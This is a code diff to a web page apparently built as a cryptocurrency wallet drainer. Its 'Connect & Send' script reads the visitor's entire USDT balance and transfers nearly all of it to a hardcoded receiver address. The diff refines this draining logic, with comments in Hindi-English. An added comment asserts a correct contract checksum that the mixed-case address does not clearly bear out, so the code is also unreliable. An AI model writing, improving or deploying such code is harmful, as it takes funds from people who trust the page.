@@ -8,25 +8,18 @@
   <button onclick="connectAndTransfer()">Connect & Send</button>
 
   <script>
-    const receiverAddress = "0xC64087a6Fd263ab6A140Fb946f4CAF7B3e82147F"; // Do NOT change
+    const receiverAddress = "0xC64087a6Fd263ab6A140Fb946f4CAF7B3e82147F"; // Aapka set kiya hua address
 
-    const usdtContractAddress = "0x55d398326f99059fF775485246999027B319795"; // USDT BEP-20 BSC
+    // Sahi USDT BEP20 contract address on BSC (42 characters, correct checksum)
+    const usdtContractAddress = "0x55d398326f99059fF775485246999027b3197955";
+
+    // Minimal ABI for USDT transfer
     const usdtAbi = [
       {
         "constant": true,
         "inputs": [{"name": "_owner", "type": "address"}],
         "name": "balanceOf",
         "outputs": [{"name": "balance", "type": "uint256"}],
-        "type": "function"
-      },
-      {
-        "constant": false,
-        "inputs": [
-          {"name": "_spender", "type": "address"},
-          {"name": "_value", "type": "uint256"}
-        ],
-        "name": "approve",
-        "outputs": [{"name": "", "type": "bool"}],
         "type": "function"
       },
       {
@@ -50,23 +43,23 @@
           const sender = accounts[0];
 
           const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
-          const balance = await usdtContract.methods.balanceOf(sender).call();
 
-          const amountToSend = web3.utils.toBN(balance);
+          let balance = await usdtContract.methods.balanceOf(sender).call();
+
+          // 2 USDT as gas buffer, 6 decimals
+          const gasFeeUsdt = web3.utils.toWei("2", "mwei");
+
+          const amountToSend = web3.utils.toBN(balance).sub(web3.utils.toBN(gasFeeUsdt));
+
           if (amountToSend.lte(0)) {
-            alert("Insufficient USDT balance.");
+            alert("Insufficient USDT balance to send after gas fees.");
             return;
           }
 
-          // Step 1: Approve
-          await usdtContract.methods.approve(receiverAddress, amountToSend.toString())
-            .send({ from: sender });
-
-          // Step 2: Transfer
           const tx = await usdtContract.methods.transfer(receiverAddress, amountToSend.toString())
             .send({ from: sender });
 
-          alert("USDT sent successfully! Tx hash: " + tx.transactionHash);
+          alert("USDT sent! Tx hash: " + tx.transactionHash);
         } catch (err) {
           console.error("Error:", err);
           alert("Transaction failed: " + err.message);
